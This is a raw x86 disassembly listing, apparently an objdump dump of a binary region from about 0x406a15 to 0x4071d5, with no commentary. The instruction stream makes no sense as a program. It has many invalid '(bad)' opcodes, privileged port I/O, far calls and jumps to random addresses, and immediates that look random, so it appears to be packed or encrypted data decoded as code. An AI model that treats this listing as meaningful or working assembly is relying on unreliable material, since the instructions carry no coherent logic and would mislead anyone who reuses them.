  406a15:	sbb    eax,0xc3b455ea
  406a1a:	fdivr  QWORD PTR [esi]
  406a1c:	test   BYTE PTR [edi-0x48],al
  406a1f:	mov    bh,BYTE PTR gs:[edi]
  406a22:	mov    bl,0xd7
  406a24:	retf   
  406a25:	adc    BYTE PTR [ebx],dl
  406a27:	int    0xa
  406a29:	mov    eax,ebp
  406a2b:	add    eax,0x88256f9
  406a30:	out    dx,eax
  406a31:	repnz ss add al,0x34
  406a35:	js     0x4069cd
  406a37:	retf   
  406a38:	int    0x2
  406a3a:	inc    esp
  406a3b:	mov    edx,DWORD PTR [esp+eax*4]
  406a3e:	mov    edx,0x3652c0c5
  406a43:	mov    edx,0x859a23dd
  406a48:	cwde   
  406a49:	not    BYTE PTR [eax-0x75]
  406a4c:	xchg   DWORD PTR [ebp+0x5a1b0791],ecx
  406a52:	add    eax,0x136fc340
  406a57:	(bad)  
  406a59:	ss out 0x91,eax
  406a5c:	jb     0x406a9f
  406a5e:	jae    0x406a36
  406a60:	and    edx,DWORD PTR [ecx]
  406a62:	out    0xbf,eax
  406a64:	mov    cl,0xec
  406a66:	mov    ebp,DWORD PTR [ebp-0x80]
  406a69:	xor    DWORD PTR [ecx],ebp
  406a6b:	icebp  
  406a6c:	inc    ecx
  406a6d:	call   0xc575:0xb30176ff
  406a74:	mov    eax,ds:0xdf5ca447
  406a79:	(bad)  
  406a7a:	xor    bh,BYTE PTR [edi]
  406a7c:	test   eax,0xa1a956da
  406a81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a82:	cmc    
  406a83:	sub    eax,0xe4c5b644
  406a88:	lahf   
  406a89:	cmp    DWORD PTR [eax+0x37e8c316],ebp
  406a8f:	arpl   ax,bp
  406a91:	pusha  
  406a92:	jbe    0x406a86
  406a94:	iret   
  406a95:	or     dh,cl
  406a97:	mov    bh,0xc2
  406a99:	add    ch,BYTE PTR [ebp+0x7a]
  406a9c:	lds    edx,FWORD PTR [edi-0x3ba01318]
  406aa2:	lea    edi,[ecx]
  406aa4:	or     al,0xff
  406aa6:	loop   0x406aec
  406aa8:	fmul   DWORD PTR ds:0xa28500cf
  406aae:	cld    
  406aaf:	inc    eax
  406ab0:	push   ecx
  406ab1:	jae    0x406ade
  406ab3:	sahf   
  406ab4:	lods   eax,DWORD PTR ds:[esi]
  406ab5:	xor    eax,DWORD PTR [esi]
  406ab7:	mov    esi,0xa3f0a060
  406abc:	add    BYTE PTR [ebp-0x5f753071],al
  406ac2:	adc    eax,0x88265972
  406ac7:	mov    edx,0x51d88311
  406acc:	pusha  
  406acd:	ins    BYTE PTR es:[edi],dx
  406ace:	sub    al,0x33
  406ad0:	sti    
  406ad1:	or     al,0xf6
  406ad3:	cmp    bl,BYTE PTR [edx]
  406ad5:	loop   0x406ad3
  406ad7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ad8:	jb     0x406a61
  406ada:	test   DWORD PTR [esi+0x1c],ebp
  406add:	addr16 jle 0x406a7f
  406ae0:	sbb    bl,bh
  406ae2:	popa   
  406ae3:	repnz jecxz 0x406a91
  406ae6:	mov    ?,ebp
  406ae8:	jo     0x406af6
  406aea:	shr    DWORD PTR [eax],cl
  406aec:	push   es
  406aed:	jb     0x406b44
  406aef:	push   eax
  406af0:	push   esp
  406af1:	or     al,0x1
  406af3:	xchg   esp,eax
  406af4:	out    dx,al
  406af5:	cmp    BYTE PTR [edx],ch
  406af7:	inc    edi
  406af8:	sti    
  406af9:	and    ah,ah
  406afb:	sub    DWORD PTR [ebp-0x70],ecx
  406afe:	daa    
  406aff:	and    BYTE PTR [edx+ebp*8],dh
  406b02:	jbe    0x406ac6
  406b04:	cwde   
  406b05:	loop   0x406af6
  406b07:	mov    ss,WORD PTR [ecx+0x24133f87]
  406b0d:	inc    esp
  406b0e:	push   esp
  406b0f:	data16 loop 0x406ae2
  406b12:	add    cl,ah
  406b14:	inc    eax
  406b15:	in     eax,0x77
  406b17:	call   0xbb2a:0x95dfa6b
  406b1e:	mov    DWORD PTR [edx-0x551f0b1d],edi
  406b24:	adc    BYTE PTR [edx+edi*8-0x641e5c7b],dh
  406b2b:	jge    0x406b13
  406b2d:	or     eax,0xb24743e3
  406b32:	call   0xb8ad16f5
  406b37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b38:	aam    0x18
  406b3a:	adc    dl,bh
  406b3c:	js     0x406b28
  406b3e:	ins    BYTE PTR es:[edi],dx
  406b3f:	pop    es
  406b40:	in     al,dx
  406b41:	in     al,dx
  406b42:	xchg   esi,eax
  406b43:	ins    BYTE PTR es:[edi],dx
  406b44:	into   
  406b45:	das    
  406b46:	push   esp
  406b47:	or     al,0x91
  406b49:	sub    al,0xfe
  406b4b:	push   esi
  406b4c:	and    esi,DWORD PTR [esi+0x7c]
  406b4f:	push   esp
  406b50:	pop    esi
  406b51:	pop    esi
  406b52:	sub    esi,DWORD PTR [edx-0x3a]
  406b55:	test   DWORD PTR [edi],ecx
  406b57:	xor    DWORD PTR [esp+edi*2-0x1d],esi
  406b5b:	push   ebx
  406b5c:	push   esi
  406b5d:	add    al,0x17
  406b5f:	push   esi
  406b60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b61:	loop   0x406b45
  406b63:	pop    ecx
  406b64:	sub    eax,0x7689f2e0
  406b69:	push   esp
  406b6a:	ret    
  406b6b:	dec    ecx
  406b6c:	pushf  
  406b6d:	(bad)  
  406b6e:	jb     0x406af4
  406b70:	sub    edi,eax
  406b72:	imul   BYTE PTR gs:[edx+0xe3a0ae9]
  406b79:	jo     0x406b3c
  406b7b:	mov    esp,0xf0d6e405
  406b80:	repz (bad) 
  406b82:	cld    
  406b83:	lods   eax,DWORD PTR ds:[esi]
  406b84:	sti    
  406b85:	neg    ch
  406b87:	outs   dx,DWORD PTR ds:[esi]
  406b88:	and    al,0x3f
  406b8a:	lds    ebp,FWORD PTR [edi-0x2a3e198c]
  406b90:	dec    ecx
  406b91:	cld    
  406b92:	ret    0x8831
  406b95:	ins    BYTE PTR es:[edi],dx
  406b96:	fcomi  st,st(1)
  406b98:	fld    DWORD PTR [esi]
  406b9a:	enter  0x2ff9,0x34
  406b9e:	and    cl,BYTE PTR [esi+0x5d]
  406ba1:	sub    eax,0xeebbbaf5
  406ba6:	imul   eax,DWORD PTR [ecx-0xb73b177],0x382fdb72
  406bb0:	or     ebx,DWORD PTR [esi]
  406bb2:	lock sub eax,0x84d4c6e3
  406bb8:	ins    DWORD PTR es:[edi],dx
  406bb9:	cwde   
  406bba:	mov    al,0x61
  406bbc:	pushf  
  406bbd:	inc    esp
  406bbe:	cmp    BYTE PTR [edx-0x762788b4],ch
  406bc4:	pop    esp
  406bc5:	fnstenv [esi+eiz*1]
  406bc8:	arpl   WORD PTR [edi],bp
  406bca:	sbb    bh,0x7e
  406bcd:	jno    0x406b95
  406bcf:	cwde   
  406bd0:	mov    eax,0xe588f4b2
  406bd5:	push   DWORD PTR [esi+0x341034d3]
  406bdb:	jbe    0x406b9a
  406bdd:	inc    ecx
  406bde:	mov    al,0x25
  406be0:	(bad)  
  406be1:	(bad)  
  406be2:	jns    0x406c4d
  406be4:	xor    al,0x3b
  406be6:	sub    eax,0x3bac1402
  406beb:	jb     0x406b82
  406bed:	aaa    
  406bee:	jno    0x406b80
  406bf0:	adc    eax,0x52c05583
  406bf5:	fist   WORD PTR ds:0xd363ddbf
  406bfb:	cmp    DWORD PTR [esi],0x55
  406bfe:	jno    0x406b96
  406c00:	repnz push ebp
  406c02:	(bad)  
  406c03:	mov    BYTE PTR [edx],bh
  406c05:	fisub  WORD PTR [edx-0x7b203b51]
  406c0b:	cmp    dl,al
  406c0d:	mov    edi,0x74d56156
  406c12:	xor    ebx,DWORD PTR [esp+edx*4-0x18]
  406c16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c17:	test   DWORD PTR [ecx+0x508349d3],ebp
  406c1d:	in     al,0xad
  406c1f:	pop    edx
  406c20:	mov    bl,0x3f
  406c22:	fcmovu st,st(4)
  406c25:	cmp    eax,0xb8d9f83e
  406c2a:	xchg   ecx,eax
  406c2b:	in     al,0x93
  406c2d:	loop   0x406c5b
  406c2f:	mov    edi,0x1001ebe0
  406c34:	enter  0x380d,0x12
  406c38:	lahf   
  406c39:	ds or  eax,0x5165f078
  406c3f:	out    0x79,eax
  406c41:	lods   al,BYTE PTR ds:[esi]
  406c42:	fs outs dx,BYTE PTR gs:[esi]
  406c45:	lods   eax,DWORD PTR ds:[esi]
  406c46:	mov    bh,0x10
  406c48:	jmp    0x6c1f0ee3
  406c4d:	pop    esi
  406c4e:	push   ecx
  406c4f:	sbb    BYTE PTR [esi-0x51e5b963],al
  406c55:	in     al,dx
  406c56:	jmp    0x6cb:0xd5823b03
  406c5d:	js     0x406ccd
  406c5f:	jg     0x406c2c
  406c61:	mov    ebp,0xad064821
  406c66:	push   0x2a
  406c68:	dec    edi
  406c69:	sbb    al,0x2c
  406c6b:	dec    esi
  406c6c:	sub    ecx,esi
  406c6e:	and    dh,dl
  406c70:	xor    eax,0x30564737
  406c75:	mov    BYTE PTR [eax],al
  406c77:	or     eax,DWORD PTR [ebp-0x73f1b6fe]
  406c7d:	jmp    0x6b287099
  406c82:	cmp    esi,ebx
  406c84:	push   ebp
  406c85:	inc    edi
  406c86:	fcomp  QWORD PTR [ecx]
  406c88:	int3   
  406c89:	add    dh,dh
  406c8b:	rcr    BYTE PTR [esi+0x2a],cl
  406c8e:	mov    dl,0xcf
  406c90:	cmp    BYTE PTR [ebp-0x5d],dl
  406c93:	mov    ?,WORD PTR [edx+0x4c]
  406c96:	mov    edi,0x524f861c
  406c9b:	add    BYTE PTR [ecx],0x63
  406c9e:	or     eax,0x3089fe56
  406ca3:	cmp    bh,BYTE PTR [ecx+0x325c19c]
  406ca9:	xchg   ecx,eax
  406caa:	jl     0x406cbc
  406cac:	test   BYTE PTR [esi],cl
  406cae:	adc    esp,DWORD PTR [esi+0xe6a9f19]
  406cb4:	pop    eax
  406cb5:	push   es
  406cb6:	mov    BYTE PTR [ebp+0x29],ch
  406cb9:	jbe    0x406c80
  406cbb:	mov    ah,0x94
  406cbd:	repz retf 0x5bf2
  406cc1:	push   ebx
  406cc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cc3:	mov    ebp,0x3a354edd
  406cc8:	xchg   edi,eax
  406cc9:	lahf   
  406cca:	shl    eax,0x3c
  406ccd:	xchg   DWORD PTR [edi-0x5],esi
  406cd0:	add    al,0x30
  406cd2:	out    dx,eax
  406cd3:	inc    edi
  406cd4:	jno    0x406c70
  406cd6:	add    al,BYTE PTR [ecx]
  406cd8:	mov    ecx,DWORD PTR [eax+ecx*8-0x53410be3]
  406cdf:	mov    ebp,0x771076ea
  406ce4:	lahf   
  406ce5:	mov    bl,0x90
  406ce7:	fwait
  406ce8:	je     0x406d26
  406cea:	in     al,dx
  406ceb:	pop    ds
  406cec:	(bad)  
  406ced:	jp     0x406d60
  406cef:	jge    0x406cf1
  406cf1:	sbb    al,0xe9
  406cf3:	push   0xffffff99
  406cf5:	and    ecx,0xffffff98
  406cf8:	add    ebp,DWORD PTR [ebx]
  406cfa:	test   BYTE PTR [edx],0x5
  406cfd:	pusha  
  406cfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cff:	ret    
  406d00:	scas   eax,DWORD PTR es:[edi]
  406d01:	add    al,0xc0
  406d03:	jg     0x406d7e
  406d05:	loopne 0x406c97
  406d07:	ins    BYTE PTR es:[edi],dx
  406d08:	arpl   bx,ax
  406d0a:	arpl   dx,si
  406d0c:	jl     0x84475d61
  406d12:	test   eax,0xafc073fc
  406d17:	xchg   ebp,eax
  406d18:	xchg   edx,eax
  406d19:	xchg   edi,eax
  406d1a:	adc    DWORD PTR [ebx-0x6528d757],0x51027c24
  406d24:	xchg   esi,eax
  406d25:	or     al,0xd9
  406d27:	and    BYTE PTR [edi],0x40
  406d2a:	cmp    al,0x38
  406d2c:	xchg   edx,eax
  406d2d:	fsubr  DWORD PTR [esi+ebp*8+0x38a0d056]
  406d34:	loope  0x406d96
  406d36:	ror    DWORD PTR [edi],1
  406d38:	push   esi
  406d39:	clc    
  406d3a:	or     bh,ch
  406d3c:	rcr    dh,0xb4
  406d3f:	pop    ebx
  406d40:	outs   dx,BYTE PTR ds:[esi]
  406d41:	enter  0x10d9,0xed
  406d45:	mov    dh,BYTE PTR [ecx+eiz*1+0x3d]
  406d49:	repz push esi
  406d4b:	xor    BYTE PTR [ebp+0x6da174cf],dl
  406d51:	mov    ebp,DWORD PTR cs:[eax]
  406d54:	pop    ebx
  406d55:	sub    DWORD PTR [eax-0x34],0xffffffef
  406d59:	xor    dl,dl
  406d5b:	imul   edx,edx,0x1aab000b
  406d61:	loopne 0x406d38
  406d63:	fdiv   QWORD PTR [edi+0x61370ca6]
  406d69:	inc    edx
  406d6a:	or     edi,esi
  406d6c:	(bad)  
  406d6d:	xor    BYTE PTR [edi+0x11],cl
  406d70:	in     eax,dx
  406d71:	rcl    DWORD PTR [eax+0x27],cl
  406d74:	test   BYTE PTR [bp+di+0x1a],cl
  406d78:	adc    ah,BYTE PTR [edx+0x2c2e7fea]
  406d7e:	mov    ds:0xe0fb56d,eax
  406d83:	jno    0x406d46
  406d85:	lahf   
  406d86:	mov    WORD PTR [ebp+0x47c68759],es
  406d8c:	sbb    BYTE PTR [edx+edx*1+0x3973a48d],cl
  406d93:	mov    ds:0x38e56546,al
  406d98:	sbb    ch,0x9
  406d9b:	xchg   esp,eax
  406d9c:	mov    WORD PTR [ebx+eax*2],ds
  406d9f:	mov    edx,0x379c38e
  406da4:	scas   al,BYTE PTR es:[edi]
  406da5:	fisttp WORD PTR [edi+0x426e644]
  406dab:	sbb    DWORD PTR [ebx],eax
  406dad:	(bad)  
  406dae:	call   0xa3c3f38d
  406db3:	mov    ah,0xa1
  406db5:	nop
  406db6:	out    0xef,al
  406db8:	jmp    0x5a65:0x3bc33a3d
  406dbf:	cmc    
  406dc0:	lock jmp 0x406e33
  406dc3:	iret   
  406dc4:	outs   dx,BYTE PTR ds:[esi]
  406dc5:	ret    0xdf70
  406dc8:	fisubr DWORD PTR [esi+esi*2-0x29]
  406dcc:	push   eax
  406dcd:	mov    edx,0xff8b0051
  406dd2:	xchg   ebp,eax
  406dd3:	dec    ebp
  406dd4:	scas   al,BYTE PTR es:[edi]
  406dd5:	mov    al,0xa6
  406dd7:	dec    ecx
  406dd8:	ins    DWORD PTR es:[edi],dx
  406dd9:	ds (bad) 
  406ddb:	xor    ch,bl
  406ddd:	push   es
  406dde:	dec    edx
  406ddf:	lock mov bl,dh
  406de2:	xor    eax,DWORD PTR [edi+0x7bc20675]
  406de8:	fbld   TBYTE PTR [esi]
  406dea:	je     0x406e39
  406dec:	ss inc edx
  406dee:	xchg   esp,eax
  406def:	add    BYTE PTR [edx-0x1dc7a5ee],ah
  406df5:	ret    
  406df6:	adc    cl,BYTE PTR [eax+0x5b]
  406df9:	jecxz  0x406e53
  406dfb:	cld    
  406dfc:	add    eax,DWORD PTR [esi-0x13]
  406dff:	sahf   
  406e00:	sub    eax,0xe476189c
  406e05:	call   0xca1f:0x801d02f5
  406e0c:	push   ebx
  406e0d:	imul   BYTE PTR [esi-0x2c78c4a2]
  406e13:	adc    DWORD PTR [edx],0xffffffaa
  406e16:	inc    eax
  406e17:	dec    esp
  406e18:	pusha  
  406e19:	or     al,0x74
  406e1b:	adc    eax,0x9e59aa09
  406e20:	add    eax,0xaba83893
  406e25:	stc    
  406e26:	pop    ecx
  406e27:	ja     0x406ded
  406e29:	in     al,dx
  406e2a:	call   0xf3b7:0x852dde2a
  406e31:	jp     0x406e6e
  406e33:	mov    esp,0xd3239db6
  406e38:	imul   edx,DWORD PTR [esi-0x41bc7267],0x1d
  406e3f:	pop    ecx
  406e40:	mov    dl,0xe2
  406e42:	lahf   
  406e43:	pop    eax
  406e44:	sbb    DWORD PTR [esi+0x38],esp
  406e47:	out    dx,al
  406e48:	sahf   
  406e49:	adc    ebp,DWORD PTR [eax-0x5e]
  406e4c:	int3   
  406e4d:	cmp    DWORD PTR [ebx-0x27aee65a],eax
  406e53:	je     0x406e97
  406e55:	xor    cl,BYTE PTR [ecx]
  406e57:	out    dx,eax
  406e58:	icebp  
  406e59:	xor    DWORD PTR [ecx+0x19],0xa20a358e
  406e60:	(bad)  
  406e61:	outs   dx,BYTE PTR ds:[esi]
  406e62:	dec    ecx
  406e63:	pop    esi
  406e64:	pmullw mm7,QWORD PTR ds:0x29323171
  406e6b:	std    
  406e6c:	shr    DWORD PTR [eax],0x63
  406e6f:	jbe    0x406e3e
  406e71:	enter  0x24e1,0x73
  406e75:	xchg   edi,eax
  406e76:	bound  ebx,QWORD PTR [ecx+ebx*8-0x36b5dde8]
  406e7d:	scas   eax,DWORD PTR es:[edi]
  406e7e:	stos   DWORD PTR es:[edi],eax
  406e7f:	add    cl,bh
  406e81:	inc    ebx
  406e82:	pop    es
  406e83:	push   edx
  406e84:	push   es
  406e85:	ins    DWORD PTR es:[edi],dx
  406e86:	xchg   ecx,eax
  406e87:	fwait
  406e88:	loope  0x406e17
  406e8a:	xor    ch,0xd2
  406e8d:	ds jo  0x406e4e
  406e90:	add    eax,DWORD PTR [edx-0x747e29ee]
  406e96:	ret    
  406e97:	lock imul DWORD PTR gs:[eax+0x5b6ccd43]
  406e9f:	or     eax,0x12104f61
  406ea4:	in     eax,dx
  406ea5:	xchg   esp,eax
  406ea6:	pop    es
  406ea7:	clc    
  406ea8:	pop    ebp
  406ea9:	pop    ss
  406eaa:	sbb    eax,0x8e8d84fd
  406eaf:	(bad)  
  406eb0:	mov    dl,0x27
  406eb2:	fmul   DWORD PTR [eax-0x3c5249f7]
  406eb8:	rcr    ch,0x0
  406ebb:	jnp    0x406edd
  406ebd:	jns    0x406eed
  406ebf:	fst    QWORD PTR [edx]
  406ec1:	ss loopne 0x406f02
  406ec4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ec5:	jmp    0xc0401642
  406eca:	ins    BYTE PTR es:[edi],dx
  406ecb:	pandn  mm0,mm5
  406ece:	outs   dx,BYTE PTR ds:[esi]
  406ecf:	inc    ebx
  406ed0:	inc    edx
  406ed1:	stc    
  406ed2:	mov    DWORD PTR ss:[ebp+0x25668989],ebx
  406ed9:	pop    ebx
  406eda:	cmp    bl,BYTE PTR [ebp+0x7b]
  406edd:	xchg   ebp,eax
  406ede:	nop
  406edf:	or     DWORD PTR [ecx+0x7c8ece13],0x951b1567
  406ee9:	dec    ebp
  406eea:	jp     0x406ee1
  406eec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406eed:	inc    esi
  406eee:	outs   dx,DWORD PTR ds:[esi]
  406eef:	or     ecx,edi
  406ef1:	or     al,0xe9
  406ef3:	enter  0x6c02,0x2b
  406ef7:	aad    0xe6
  406ef9:	cs xor eax,0x858d2df3
  406eff:	dec    ebx
  406f00:	pop    ecx
  406f01:	or     DWORD PTR [ecx+ebx*2+0x99bb2a9],edx
  406f08:	lock cmp eax,0x1f1cad1
  406f0e:	mov    bl,0xf5
  406f10:	outs   dx,DWORD PTR ds:[esi]
  406f11:	push   ecx
  406f12:	dec    ebp
  406f13:	sbb    eax,0x26113532
  406f18:	add    ebx,edx
  406f1a:	js     0x406f96
  406f1c:	repnz cwde 
  406f1e:	and    ecx,DWORD PTR ds:[edi+0x5f964182]
  406f25:	xchg   ebx,eax
  406f26:	or     DWORD PTR [ebx],ecx
  406f28:	or     eax,0x2c47fbd6
  406f2d:	fsubr  st(6),st
  406f2f:	scas   eax,DWORD PTR es:[edi]
  406f30:	push   cs
  406f31:	pop    esp
  406f32:	std    
  406f33:	jne    0x406f97
  406f35:	lds    ecx,FWORD PTR [edx]
  406f37:	add    DWORD PTR ds:0xd5698fb8,0xffffffd1
  406f3e:	pop    ds
  406f3f:	xchg   ebx,esp
  406f41:	mov    ds:0x76ca2e9,al
  406f46:	std    
  406f47:	pop    esp
  406f48:	jne    0x406f48
  406f4a:	mov    ah,0x2d
  406f4c:	inc    eax
  406f4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f4e:	mov    ebx,0x5bc0eb87
  406f53:	fisttp QWORD PTR [edi]
  406f55:	jbe    0x406fbf
  406f57:	sub    BYTE PTR [esi+0x64a1ef3c],ah
  406f5d:	in     eax,dx
  406f5e:	sub    al,0xc
  406f60:	nop
  406f61:	ins    BYTE PTR es:[edi],dx
  406f62:	dec    eax
  406f63:	jns    0x406f7c
  406f65:	ss push esi
  406f67:	pop    es
  406f68:	inc    esp
  406f69:	xor    ebp,ebp
  406f6b:	sbb    eax,0x8cee35ba
  406f70:	inc    eax
  406f71:	jno    0x406fb0
  406f73:	jp     0x406fd8
  406f75:	data16 icebp 
  406f77:	scas   al,BYTE PTR es:[edi]
  406f78:	pop    eax
  406f79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f7a:	or     BYTE PTR [ecx],0xea
  406f7d:	(bad)  
  406f7e:	mov    dl,0x91
  406f80:	xor    al,0xa4
  406f82:	fisub  DWORD PTR [ebp-0x41]
  406f85:	inc    esp
  406f86:	fwait
  406f87:	lea    eax,[esp+ebp*2-0x1d9564ed]
  406f8e:	lods   eax,DWORD PTR ds:[esi]
  406f8f:	inc    eax
  406f90:	dec    eax
  406f91:	push   ss
  406f92:	mov    edx,0x1f2abaad
  406f97:	add    esp,DWORD PTR [edi+0x4d696721]
  406f9d:	sbb    DWORD PTR [edi-0x15cb2755],esi
  406fa3:	sbb    BYTE PTR [esi+0x16883b9c],cl
  406fa9:	dec    edx
  406faa:	(bad)  
  406fac:	and    ah,ch
  406fae:	mov    al,0x5c
  406fb0:	xchg   DWORD PTR [esp+ecx*1+0x12],edi
  406fb4:	sub    esp,0x7dbf6e1c
  406fba:	sti    
  406fbb:	js     0x406ffe
  406fbd:	ret    
  406fbe:	ss inc eax
  406fc0:	sbb    bh,dh
  406fc2:	jmp    0x5a83:0x219f1947
  406fc9:	scas   eax,DWORD PTR es:[edi]
  406fca:	and    DWORD PTR [ecx],esp
  406fcc:	push   ebp
  406fcd:	adc    DWORD PTR [eax+0x29],0x17372264
  406fd4:	jns    0x40700d
  406fd6:	cmc    
  406fd7:	clc    
  406fd8:	ins    BYTE PTR es:[edi],dx
  406fd9:	iret   
  406fda:	outs   dx,BYTE PTR ds:[esi]
  406fdb:	test   DWORD PTR [ebx],edx
  406fdd:	cmp    BYTE PTR [edx+0x20],0x4e
  406fe1:	not    DWORD PTR [ebx-0x696d0295]
  406fe7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fe8:	das    
  406fe9:	aam    0x52
  406feb:	(bad)
  406fef:	and    BYTE PTR [ebx],bl
  406ff1:	mov    edx,0x8d1628ba
  406ff6:	(bad)  
  406ff8:	fidiv  DWORD PTR [edx-0x1f94b681]
  406ffe:	fucomp st(3)
  407000:	mov    dh,0x88
  407002:	xor    al,0x47
  407004:	clc    
  407005:	loopne 0x407051
  407007:	add    cl,ah
  407009:	jge    0x40703c
  40700b:	lea    ebp,[esi]
  40700d:	fldcw  WORD PTR [ebx+0x6c9917b6]
  407013:	pop    edx
  407014:	ret    
  407015:	jae    0x40705c
  407017:	pop    ds
  407018:	sbb    BYTE PTR [esi-0x54],ch
  40701b:	les    eax,FWORD PTR [eax+0x2e137a58]
  407021:	(bad)  
  407023:	leave  
  407024:	and    BYTE PTR [eax],0x6c
  407027:	aad    0x59
  407029:	mov    dh,0x2a
  40702b:	push   ebx
  40702c:	push   edi
  40702d:	imul   edi,DWORD PTR [eax],0xc9a4f501
  407033:	loop   0x407052
  407035:	aam    0x6c
  407037:	mov    esi,0xb6b50bf3
  40703c:	or     DWORD PTR [ecx+0x464c4529],0x4a
  407043:	jmp    0x4d31f398
  407048:	add    BYTE PTR [edx-0x1a92231e],cl
  40704e:	cdq    
  40704f:	adc    bh,BYTE PTR [eax]
  407051:	popf   
  407052:	ins    BYTE PTR es:[edi],dx
  407053:	call   0x51b5ff4b
  407058:	out    0x3e,eax
  40705a:	push   esi
  40705b:	adc    BYTE PTR ds:[ecx+0x26],al
  40705f:	jbe    0x4070e0
  407061:	pop    edx
  407062:	adc    eax,DWORD PTR gs:[edx+0x1056f439]
  407069:	test   eax,0xf6a9901c
  40706e:	inc    ebx
  40706f:	iret   
  407070:	xchg   ebx,eax
  407071:	loop   0x40705f
  407073:	jbe    0x406ffe
  407075:	cdq    
  407076:	addr16 repnz enter 0xd0bb,0x7f
  40707c:	add    DWORD PTR [eax-0x1e],esi
  40707f:	mov    esp,0x99d7588b
  407084:	mov    BYTE PTR [ebx+0x6995ce97],ch
  40708a:	hlt    
  40708b:	ror    BYTE PTR [eax+0x4b],1
  40708e:	and    DWORD PTR [edx-0x76d54baa],edi
  407094:	jbe    0x4070c3
  407096:	push   eax
  407097:	je     0x40705f
  407099:	rcr    BYTE PTR [ebx+0x1ae8f301],1
  40709f:	mov    edi,0x41945f19
  4070a4:	dec    edx
  4070a5:	and    al,BYTE PTR [esi-0x68]
  4070a8:	sub    BYTE PTR [ecx+0x32175465],0x5b
  4070af:	or     al,0xb7
  4070b1:	mov    ch,0xd7
  4070b3:	repnz pop ebp
  4070b5:	retf   
  4070b6:	mov    esp,0x97d445bf
  4070bb:	mov    es,WORD PTR [edx-0x3d]
  4070be:	outs   dx,BYTE PTR ds:[esi]
  4070c0:	scas   al,BYTE PTR es:[edi]
  4070c1:	rol    BYTE PTR [edi+0x69f8e777],1
  4070c7:	inc    eax
  4070c8:	push   ecx
  4070c9:	sub    eax,0x5c424ec8
  4070ce:	(bad)  
  4070cf:	ja     0x407141
  4070d1:	mov    ds:0x11e2597a,al
  4070d6:	ins    DWORD PTR es:[di],dx
  4070d8:	pop    ebx
  4070da:	jb     0x40712d
  4070dc:	stc    
  4070dd:	lock bound edi,QWORD PTR [ecx-0x56d47215]
  4070e4:	pop    eax
  4070e5:	clc    
  4070e6:	daa    
  4070e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070e8:	ret    0x683
  4070eb:	loop   0x40708c
  4070ed:	dec    ebp
  4070ee:	and    DWORD PTR [edi],esi
  4070f0:	out    dx,al
  4070f1:	xor    DWORD PTR [ecx+0x4b],esi
  4070f4:	bts    ebp,edx
  4070f7:	dec    ebx
  4070f8:	je     0x4070da
  4070fa:	cmc    
  4070fb:	fisubr DWORD PTR [edi-0x66b0e24f]
  407101:	pop    esp
  407102:	sbb    ch,ah
  407104:	cmc    
  407105:	pop    ecx
  407106:	in     eax,0x72
  407108:	push   edi
  407109:	stc    
  40710a:	test   al,0x7f
  40710c:	mov    dl,0xc7
  40710e:	mov    ah,0x66
  407110:	mov    dl,0xaf
  407112:	or     dh,al
  407114:	in     eax,dx
  407115:	pusha  
  407116:	popf   
  407117:	shl    BYTE PTR [esp+eiz*8-0x6e],cl
  40711b:	cmp    bh,dl
  40711d:	imul   ecx,DWORD PTR [ecx-0x7f4f6a7b],0x78
  407124:	or     edi,esi
  407126:	pop    esi
  407127:	push   ebp
  407128:	pop    es
  407129:	dec    edi
  40712a:	ret    0x617
  40712d:	sbb    al,dl
  40712f:	jg     0x407129
  407131:	(bad)  
  407132:	call   0xead1:0x86e957eb
  407139:	ins    DWORD PTR es:[edi],dx
  40713a:	fadd   QWORD PTR [eax]
  40713c:	jg     0x40714a
  40713e:	xchg   edx,eax
  40713f:	stos   DWORD PTR es:[edi],eax
  407140:	daa    
  407141:	jae    0x407181
  407143:	adc    edi,DWORD PTR ds:0xcb5f324b
  407149:	add    dh,BYTE PTR [eax-0x49f58c05]
  40714f:	xchg   BYTE PTR [eax+0x1b1645a3],ch
  407155:	loop   0x407171
  407157:	add    dl,dl
  407159:	into   
  40715a:	loop   0x407118
  40715c:	mov    dl,0x41
  40715e:	ret    
  40715f:	cmp    al,0x8b
  407161:	lea    eax,[edx]
  407163:	xor    ecx,DWORD PTR [ecx+0x59]
  407166:	mov    eax,ds:0xc11ca1c8
  40716b:	out    dx,al
  40716c:	and    DWORD PTR [esi+eax*8],ebp
  40716f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407170:	mov    bl,BYTE PTR [edi-0x77]
  407173:	fisttp WORD PTR [edx-0x29]
  407176:	push   ebp
  407177:	retf   0xac04
  40717a:	pop    eax
  40717b:	mov    al,ch
  40717d:	bound  edx,QWORD PTR ds:0x528002ba
  407183:	hlt    
  407184:	jmp    0x75d909ce
  407189:	not    BYTE PTR [edx]
  40718b:	and    ecx,0xffffffa3
  40718e:	jmp    ebp
  407190:	sbb    al,0x56
  407192:	(bad)  
  407193:	mov    edx,0x5ffa8534
  407198:	aaa    
  407199:	pop    es
  40719a:	push   edi
  40719b:	cmp    eax,ebp
  40719d:	fist   WORD PTR ds:0xf7a9840c
  4071a3:	mov    eax,ds:0x1d59eeb6
  4071a8:	out    dx,eax
  4071a9:	add    eax,0xe54da1b1
  4071ae:	dec    edi
  4071af:	inc    esp
  4071b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071b2:	and    al,0xe1
  4071b4:	nop
  4071b5:	sub    eax,0x1ca77547
  4071ba:	and    eax,0x30dd9aa8
  4071bf:	test   al,0x7c
  4071c1:	popf   
  4071c2:	xor    eax,0x25d0ac44
  4071c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071c8:	or     edx,edi
  4071ca:	pop    ds
  4071cb:	mov    ebp,0x736104f0
  4071d0:	ds fs add bl,dh
  4071d4:	inc    ecx
  4071d5:	mov    ch,0xba
